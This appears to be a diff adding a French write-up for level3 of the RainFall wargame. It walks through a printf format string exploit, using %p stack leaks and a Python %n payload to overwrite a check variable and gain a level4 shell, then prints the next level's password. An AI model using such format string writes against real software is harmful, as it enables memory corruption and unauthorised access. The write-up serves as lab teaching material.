@@ -1,0 +1,38 @@
+ref http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html#fnref-2
+====================================================================================================
+
+Contrairement à gets, on ne peut pas exploiter fgets car il controle le nombre de characters copiés.
+	0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+
+Cependant, on peut voir:
+	0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+On va donc essayer d'exploiter le format string de printf en demandant de printer des pointeurs:
+	level3@RainFall:~$ ./level3
+	%p %p %p %p
+	200 b7fd1ac0 b7ff37d0 25207825
+
+Ca fonctionne, il nous print des pointeurs de la stack!
+Il faut trouver le pointeur de notre input: on met la string AAAA puis on print les pointeurs:
+	level3@RainFall:~$ ./level3
+	AAAA %p %p %p %p %p %p %p %p %p %p
+	AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+On obtient nos 'A' (41414141) au 4eme  ^^^^^^^^ pointeur.
+
+Maintenant, il faut trouver une adresse a overide dans le programme.
+On voit que pour nous donner l'acces au shell il compare eax avec 0x40 (64), qu'il obtient à l'adresse 0x804988c :
+	0x080484da <+54>:    mov    0x804988c,%eax
+	0x080484df <+59>:    cmp    $0x40,%eax
+
+Il nous faut donc envoyer la valeur 0x40 dans cette adresse.
+Grace au format 'n' de printf on peut envoyer le nombre de characters ecrits avant dans le 4eme pointeur en arg, man printf:
+	n : The argument shall be a pointer to an integer into which is written the number of bytes written to the output so far by this call to one of the fprintf() functions. No argument is converted.
+
+En utilisant python, et le %<val>x de printf pour le padding de 60 chars (on a deja ecrit 4 chars avec l'adresse) , on obtient notre commande finale :
+	level3@RainFall:~$ /usr/bin/python -c 'import sys; sys.stdout.write("\x8c\x98\x04\x08%60x%4$n")' > /tmp/exploit2
+	level3@RainFall:~$ cat /tmp/exploit2 - | ./level3
+	�                                                         200
+	Wait what?!
+	whoami
+	level4
+	cat /home/user/level4/.pass
+	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
